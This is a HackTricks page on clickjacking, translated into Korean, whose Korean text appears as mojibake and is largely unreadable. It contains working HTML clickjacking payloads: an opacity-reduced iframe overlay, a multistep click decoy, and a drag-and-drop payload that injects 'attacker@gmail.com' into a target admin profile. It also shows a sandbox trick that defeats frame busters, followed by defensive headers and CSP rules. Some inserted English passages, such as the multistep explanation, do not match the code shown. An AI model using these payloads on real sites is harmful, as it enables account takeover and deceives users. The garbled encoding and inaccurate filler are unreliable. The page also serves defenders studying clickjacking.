# í´ë¦­ì¬í‚¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks)ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬**ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## í´ë¦­ì¬í‚¹ì´ë€

í´ë¦­ì¬í‚¹ ê³µê²©ì—ì„œëŠ” **ì‚¬ìš©ì**ê°€ **ë³´ì´ì§€ ì•ŠëŠ”** ë˜ëŠ” ë‹¤ë¥¸ ìš”ì†Œë¡œ ìœ„ì¥í•œ ì›¹í˜ì´ì§€ì˜ **ìš”ì†Œ**ë¥¼ **í´ë¦­**í•˜ë„ë¡ **ì†ì´ëŠ”** ê²ƒì…ë‹ˆë‹¤. ì´ ì¡°ì‘ì€ ì‚¬ìš©ìì—ê²Œ ì˜ë„í•˜ì§€ ì•Šì€ ê²°ê³¼ë¥¼ ì´ˆë˜í•  ìˆ˜ ìˆìœ¼ë©°, ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ ë‹¤ìš´ë¡œë“œ, ì•…ì„± ì›¹í˜ì´ì§€ë¡œì˜ ë¦¬ë””ë ‰ì…˜, ìê²©ì¦ëª…ì´ë‚˜ ë¯¼ê°í•œ ì •ë³´ ì œê³µ, ìê¸ˆ ì´ì²´, ì œí’ˆ ì˜¨ë¼ì¸ êµ¬ë§¤ ë“±ì´ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### í¼ ë¯¸ë¦¬ ì±„ìš°ê¸° íŠ¸ë¦­

ê°€ë”ì€ í˜ì´ì§€ë¥¼ ë¡œë“œí•  ë•Œ GET ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í¼ì˜ í•„ë“œ ê°’ì„ **ë¯¸ë¦¬ ì±„ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ê³µê²©ìëŠ” ì´ ë™ì‘ì„ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ ë°ì´í„°ë¡œ í¼ì„ ì±„ìš°ê³  í´ë¦­ì¬í‚¹ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ì–´ ì‚¬ìš©ìê°€ ì œì¶œ ë²„íŠ¼ì„ ëˆ„ë¥´ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë“œë˜ê·¸ ì•¤ ë“œë¡­ìœ¼ë¡œ í¼ ì±„ìš°ê¸°

ì‚¬ìš©ìì—ê²Œ **í¼ì„ ì±„ìš°ë„ë¡** ìš”êµ¬í•˜ì§€ë§Œ ì§ì ‘ì ìœ¼ë¡œ íŠ¹ì • ì •ë³´(ì˜ˆ: ì•Œê³  ìˆëŠ” ì´ë©”ì¼ ë˜ëŠ” íŠ¹ì • ë¹„ë°€ë²ˆí˜¸)ë¥¼ ì‘ì„±í•˜ë„ë¡ ìš”ì²­í•˜ê³  ì‹¶ì§€ ì•Šì€ ê²½ìš°, [**ì´ ì˜ˆì œ**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)ì™€ ê°™ì´ ì œì–´ ê°€ëŠ¥í•œ ë°ì´í„°ë¥¼ ì‘ì„±í•  ìˆ˜ ìˆëŠ” ê²ƒì„ ë“œë˜ê·¸ ì•¤ ë“œë¡­ìœ¼ë¡œ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê¸°ë³¸ì ì¸ í˜ì´ë¡œë“œ
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### ë‹¤ë‹¨ê³„ í˜ì´ë¡œë“œ

A multistep payload is a technique used in clickjacking attacks to perform multiple actions in a single click. This technique involves dividing the payload into multiple steps, each corresponding to a specific action. By using iframes and manipulating their properties, the attacker can trick the victim into unknowingly performing these actions.

To implement a multistep payload, the attacker first creates an invisible iframe that overlays the target website. The iframe is positioned in such a way that it covers a specific element or button on the target website that the attacker wants the victim to click on. The attacker then modifies the properties of the iframe to make it transparent or hidden from view.

Next, the attacker creates a series of iframes, each containing the code for a specific action. These iframes are stacked on top of each other, with the first iframe containing the code for the initial action and subsequent iframes containing the code for subsequent actions. The attacker manipulates the properties of each iframe to make them invisible or hidden.

When the victim clicks on the targeted element or button, they are actually clicking on the invisible iframe overlaying it. This triggers the execution of the multistep payload, with each iframe performing its corresponding action. The victim remains unaware of these actions, as they only see the original element or button being clicked.

By using a multistep payload, an attacker can perform a series of actions on behalf of the victim without their knowledge or consent. This technique can be used to carry out various malicious activities, such as submitting forms, making purchases, or changing account settings, all without the victim's awareness.
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### ë“œë˜ê·¸ & ë“œë¡­ + í´ë¦­ í˜ì´ë¡œë“œ

This technique combines the use of drag and drop functionality with a click payload to perform a clickjacking attack. Clickjacking is a type of attack where an attacker tricks a user into clicking on a malicious element disguised as a legitimate element on a web page.

ì´ ê¸°ë²•ì€ ë“œë˜ê·¸ ì•¤ ë“œë¡­ ê¸°ëŠ¥ê³¼ í´ë¦­ í˜ì´ë¡œë“œë¥¼ ê²°í•©í•˜ì—¬ í´ë¦­ì¬í‚¹ ê³µê²©ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. í´ë¦­ì¬í‚¹ì€ ê³µê²©ìê°€ ì›¹ í˜ì´ì§€ì—ì„œ í•©ë²•ì ì¸ ìš”ì†Œë¡œ ìœ„ì¥í•œ ì•…ì„± ìš”ì†Œë¥¼ ì‚¬ìš©ìë¡œ ì†ì—¬ í´ë¦­í•˜ë„ë¡ ìœ ë„í•˜ëŠ” ìœ í˜•ì˜ ê³µê²©ì…ë‹ˆë‹¤.

To execute this attack, the attacker first creates a draggable element on a web page. This element is typically hidden from the user's view. The attacker then overlays a transparent or semi-transparent element on top of the draggable element, making it appear as if the user is interacting with the legitimate element.

ì´ ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ê³µê²©ìëŠ” ë¨¼ì € ì›¹ í˜ì´ì§€ì— ë“œë˜ê·¸ ê°€ëŠ¥í•œ ìš”ì†Œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´ ìš”ì†ŒëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ìì˜ ì‹œì•¼ì—ì„œ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ê³µê²©ìëŠ” ë“œë˜ê·¸ ê°€ëŠ¥í•œ ìš”ì†Œ ìœ„ì— íˆ¬ëª… ë˜ëŠ” ë°˜íˆ¬ëª…í•œ ìš”ì†Œë¥¼ ê²¹ì³ ë†“ì•„ ì‚¬ìš©ìê°€ í•©ë²•ì ì¸ ìš”ì†Œì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ë„ë¡ ë§Œë“­ë‹ˆë‹¤.

When the user interacts with the visible element by dragging it, the hidden draggable element is also moved accordingly. However, the user is unaware of this hidden element. The attacker can then position the hidden element over a target element, such as a button or a link, and make it appear as if the user is clicking on the target element.

ì‚¬ìš©ìê°€ ë³´ì´ëŠ” ìš”ì†Œì™€ ìƒí˜¸ì‘ìš©í•˜ì—¬ ë“œë˜ê·¸í•  ë•Œ, ìˆ¨ê²¨ì§„ ë“œë˜ê·¸ ê°€ëŠ¥í•œ ìš”ì†Œë„ ê·¸ì— ë”°ë¼ ì´ë™ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‚¬ìš©ìëŠ” ì´ ìˆ¨ê²¨ì§„ ìš”ì†Œë¥¼ ì¸ì‹í•˜ì§€ ëª»í•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ê·¸ëŸ° ë‹¤ìŒ ìˆ¨ê²¨ì§„ ìš”ì†Œë¥¼ ëŒ€ìƒ ìš”ì†Œ(ë²„íŠ¼ ë˜ëŠ” ë§í¬ ë“±) ìœ„ì— ìœ„ì¹˜ì‹œí‚¤ê³  ì‚¬ìš©ìê°€ ëŒ€ìƒ ìš”ì†Œë¥¼ í´ë¦­í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë³´ì´ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

By combining the drag and drop functionality with a click payload, the attacker can trick the user into unknowingly performing actions on the target element, such as submitting a form, making a purchase, or performing any other action that the target element is designed to perform.

ë“œë˜ê·¸ ì•¤ ë“œë¡­ ê¸°ëŠ¥ê³¼ í´ë¦­ í˜ì´ë¡œë“œë¥¼ ê²°í•©í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ì‚¬ìš©ìê°€ ëŒ€ìƒ ìš”ì†Œì— ëŒ€í•´ ì•Œì§€ ëª»í•œ ì±„ë¡œ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë„ë¡ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‘ì—…ì—ëŠ” ì–‘ì‹ ì œì¶œ, êµ¬ë§¤, ë˜ëŠ” ëŒ€ìƒ ìš”ì†Œê°€ ìˆ˜í–‰í•˜ë„ë¡ ì„¤ê³„ëœ ê¸°íƒ€ ì‘ì—… ë“±ì´ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + í´ë¦­ì¬í‚¹

ì‚¬ìš©ìê°€ ì–´ë–¤ ìš”ì†Œë¥¼ í´ë¦­í•˜ì—¬ XSSë¥¼ íŠ¸ë¦¬ê±°í•´ì•¼ í•˜ëŠ” **XSS ê³µê²©**ì„ ì‹ë³„í–ˆê³ , í˜ì´ì§€ê°€ **í´ë¦­ì¬í‚¹ì— ì·¨ì•½**í•˜ë‹¤ë©´, ì‚¬ìš©ìë¥¼ ì†ì—¬ ë²„íŠ¼/ë§í¬ë¥¼ í´ë¦­í•˜ë„ë¡ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì˜ˆì‹œ:\
_ê³„ì •ì˜ ì¼ë¶€ **ê°œì¸ ì •ë³´**(ì˜¤ì§ ë‹¹ì‹ ë§Œ ì„¤ì •í•˜ê³  ì½ì„ ìˆ˜ ìˆëŠ” ì •ë³´)ì—ì„œ **ìì²´ XSS**ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ì„¤ì •í•˜ëŠ” **í¼**ì´ **í´ë¦­ì¬í‚¹ì— ì·¨ì•½**í•˜ë©°, GET ë§¤ê°œë³€ìˆ˜ë¡œ **í¼**ì„ **ì‚¬ì „ ì±„ìš°ê¸°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._\
\_\_ê³µê²©ìëŠ” **í´ë¦­ì¬í‚¹** ê³µê²©ì„ ì¤€ë¹„í•˜ì—¬ **XSS í˜ì´ë¡œë“œ**ë¡œ **í¼**ì„ **ì‚¬ì „ ì±„ìš°ê¸°**í•˜ê³  **ì‚¬ìš©ì**ë¥¼ **í¼ ì œì¶œ**ìœ¼ë¡œ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ **í¼ì´ ì œì¶œë˜ê³  ê°’ì´ ìˆ˜ì •**ë˜ë©´ **ì‚¬ìš©ìê°€ XSSë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤.

## í´ë¦­ì¬í‚¹ ì™„í™”ë¥¼ ìœ„í•œ ì „ëµ

### í´ë¼ì´ì–¸íŠ¸ ì¸¡ ë°©ì–´

í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” í´ë¦­ì¬í‚¹ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì‘ìš© í”„ë¡œê·¸ë¨ ì°½ì´ ì£¼ ì°½ ë˜ëŠ” ìµœìƒìœ„ ì°½ì¸ì§€ í™•ì¸í•©ë‹ˆë‹¤.
* ëª¨ë“  í”„ë ˆì„ì„ í‘œì‹œí•©ë‹ˆë‹¤.
* ë³´ì´ì§€ ì•ŠëŠ” í”„ë ˆì„ì—ì„œì˜ í´ë¦­ì„ ë°©ì§€í•©ë‹ˆë‹¤.
* í´ë¦­ì¬í‚¹ ì‹œë„ë¥¼ ê°ì§€í•˜ê³  ì‚¬ìš©ìì—ê²Œ ê²½ê³ í•©ë‹ˆë‹¤.

í•˜ì§€ë§Œ ì´ëŸ¬í•œ í”„ë ˆì„ ë°©ì§€ ìŠ¤í¬ë¦½íŠ¸ëŠ” ìš°íšŒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ë¸Œë¼ìš°ì €ì˜ ë³´ì•ˆ ì„¤ì •:** ì¼ë¶€ ë¸Œë¼ìš°ì €ëŠ” ë³´ì•ˆ ì„¤ì •ì´ë‚˜ JavaScript ì§€ì› ë¶€ì¡±ìœ¼ë¡œ ì¸í•´ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **HTML5 iframe `sandbox` ì†ì„±:** ê³µê²©ìëŠ” `allow-forms` ë˜ëŠ” `allow-scripts` ê°’ì„ ê°€ì§„ `sandbox` ì†ì„±ì„ ì„¤ì •í•˜ì—¬ í”„ë ˆì„ ë²„ìŠ¤í„° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë¬´ë ¥í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ iframeì´ ìµœìƒìœ„ ì°½ì¸ì§€ í™•ì¸í•˜ì§€ ëª»í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` ë° `allow-scripts` ê°’ì€ iframe ë‚´ì—ì„œ ì‘ì—…ì„ í™œì„±í™”í•˜ë©´ì„œ ìƒìœ„ ìˆ˜ì¤€ íƒìƒ‰ì„ ë¹„í™œì„±í™”í•©ë‹ˆë‹¤. ëŒ€ìƒ ì‚¬ì´íŠ¸ì˜ ì˜ë„ëœ ê¸°ëŠ¥ì„ ë³´ì¥í•˜ê¸° ìœ„í•´ ê³µê²© ìœ í˜•ì— ë”°ë¼ `allow-same-origin` ë° `allow-modals`ì™€ ê°™ì€ ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¸Œë¼ìš°ì € ì½˜ì†” ë©”ì‹œì§€ëŠ” í—ˆìš©í•  ê¶Œí•œì„ ì•ˆë‚´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì„œë²„ ì¸¡ ë°©ì–´

#### X-Frame-Options

**`X-Frame-Options` HTTP ì‘ë‹µ í—¤ë”**ëŠ” í˜ì´ì§€ë¥¼ `<frame>` ë˜ëŠ” `<iframe>`ì—ì„œ ë Œë”ë§í•˜ëŠ” ê²ƒì˜ ì ë²•ì„±ì— ëŒ€í•´ ë¸Œë¼ìš°ì €ì— ì•Œë ¤ì£¼ì–´ Clickjackingì„ ë°©ì§€í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤:

* `X-Frame-Options: deny` - ì–´ë–¤ ë„ë©”ì¸ë„ ì½˜í…ì¸ ë¥¼ í”„ë ˆì„í™”í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
* `X-Frame-Options: sameorigin` - í˜„ì¬ ì‚¬ì´íŠ¸ë§Œ ì½˜í…ì¸ ë¥¼ í”„ë ˆì„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `X-Frame-Options: allow-from https://trusted.com` - ì§€ì •ëœ 'uri'ë§Œ í˜ì´ì§€ë¥¼ í”„ë ˆì„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì£¼ì˜í•  ì : ë¸Œë¼ìš°ì €ê°€ ì´ ì§€ì‹œë¬¸ì„ ì§€ì›í•˜ì§€ ì•Šìœ¼ë©´ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë¶€ ë¸Œë¼ìš°ì €ëŠ” CSP frame-ancestors ì§€ì‹œë¬¸ì„ ì„ í˜¸í•©ë‹ˆë‹¤.

#### Content Security Policy (CSP) frame-ancestors ì§€ì‹œë¬¸

**CSPì˜ `frame-ancestors` ì§€ì‹œë¬¸**ì€ Clickjacking ë³´í˜¸ë¥¼ ìœ„í•œ ê¶Œì¥ ë°©ë²•ì…ë‹ˆë‹¤:

* `frame-ancestors 'none'` - `X-Frame-Options: deny`ì™€ ìœ ì‚¬í•©ë‹ˆë‹¤.
* `frame-ancestors 'self'` - `X-Frame-Options: sameorigin`ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤.
* `frame-ancestors trusted.com` - `X-Frame-Options: allow-from`ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ CSPëŠ” ë™ì¼í•œ ë„ë©”ì¸ì—ì„œë§Œ í”„ë ˆì„í™”ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤:

`Content-Security-Policy: frame-ancestors 'self';`

ë” ìì„¸í•œ ë‚´ìš©ê³¼ ë³µì¡í•œ ì˜ˆì œëŠ” [frame-ancestors CSP ë¬¸ì„œ](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) ë° [Mozillaì˜ CSP frame-ancestors ë¬¸ì„œ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `child-src` ë° `frame-src`ë¥¼ ì‚¬ìš©í•œ Content Security Policy (CSP)

**Content Security Policy (CSP)**ëŠ” ë¸Œë¼ìš°ì €ê°€ ì–´ë–¤ ì†ŒìŠ¤ë¥¼ í—ˆìš©í•˜ì—¬ ì½˜í…ì¸ ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆëŠ”ì§€ ì§€ì •í•˜ì—¬ Clickjacking ë° ê¸°íƒ€ ì½”ë“œ ì‚½ì… ê³µê²©ì„ ë°©ì§€í•˜ëŠ” ë³´ì•ˆ ì¡°ì¹˜ì…ë‹ˆë‹¤.

#### `frame-src` ì§€ì‹œë¬¸
- í”„ë ˆì„ì— ëŒ€í•œ ìœ íš¨í•œ ì†ŒìŠ¤ë¥¼ ì •ì˜í•©ë‹ˆë‹¤.
- `default-src` ì§€ì‹œë¬¸ë³´ë‹¤ êµ¬ì²´ì ì…ë‹ˆë‹¤.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
ì´ ì •ì±…ì€ ë™ì¼ ì¶œì²˜(self)ì™€ https://trusted-website.comì—ì„œ í”„ë ˆì„ì„ í—ˆìš©í•©ë‹ˆë‹¤.

#### `child-src` ì§€ì‹œë¬¸
- CSP ë ˆë²¨ 2ì—ì„œ ë„ì…ë˜ì–´ ì›¹ ì›Œì»¤ì™€ í”„ë ˆì„ì˜ ìœ íš¨í•œ ì†ŒìŠ¤ë¥¼ ì„¤ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
- frame-src ë° worker-srcì— ëŒ€í•œ ëŒ€ì²´ ì˜µì…˜ìœ¼ë¡œ ì‘ë™í•©ë‹ˆë‹¤.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
ì´ ì •ì±…ì€ ë™ì¼ ì¶œì²˜(self)ì™€ https://trusted-website.comì˜ í”„ë ˆì„ê³¼ ì›Œì»¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.

**ì‚¬ìš© ë…¸íŠ¸:**
- íê¸° ì˜ˆì •: child-srcëŠ” frame-srcì™€ worker-srcë¥¼ ì„ í˜¸í•˜ì—¬ ë‹¨ê³„ì ìœ¼ë¡œ íê¸°ë©ë‹ˆë‹¤.
- ëŒ€ì²´ ë™ì‘: frame-srcê°€ ì—†ëŠ” ê²½ìš°, í”„ë ˆì„ì— ëŒ€í•œ ëŒ€ì²´ë¡œ child-srcê°€ ì‚¬ìš©ë©ë‹ˆë‹¤. ë‘˜ ë‹¤ ì—†ëŠ” ê²½ìš°, default-srcê°€ ì‚¬ìš©ë©ë‹ˆë‹¤.
- ì—„ê²©í•œ ì†ŒìŠ¤ ì •ì˜: ì•…ìš©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì§€ì‹œë¬¸ì— ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì†ŒìŠ¤ë§Œ í¬í•¨í•˜ì„¸ìš”.

#### ìë°”ìŠ¤í¬ë¦½íŠ¸ í”„ë ˆì„ ì°¨ë‹¨ ìŠ¤í¬ë¦½íŠ¸

ì™„ë²½í•˜ê²Œ ë³´í˜¸ë˜ì§€ëŠ” ì•Šì§€ë§Œ, ìë°”ìŠ¤í¬ë¦½íŠ¸ ê¸°ë°˜ì˜ í”„ë ˆì„ ì°¨ë‹¨ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ í˜ì´ì§€ê°€ í”„ë ˆì„ì— í¬í•¨ë˜ëŠ” ê²ƒì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆì‹œ:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Anti-CSRF í† í° ì‚¬ìš©

* **í† í° ìœ íš¨ì„± ê²€ì‚¬:** ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ Anti-CSRF í† í°ì„ ì‚¬ìš©í•˜ì—¬ ìƒíƒœ ë³€ê²½ ìš”ì²­ì´ ì‚¬ìš©ìì— ì˜í•´ ì˜ë„ì ìœ¼ë¡œ ì´ë£¨ì–´ì§€ê³  Clickjacked í˜ì´ì§€ë¥¼ í†µí•´ ì´ë£¨ì–´ì§€ì§€ ì•Šë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ ê³ ê¸‰ìŠ¤ëŸ¬ìš´ ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¥¼ í™œìš©í•œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
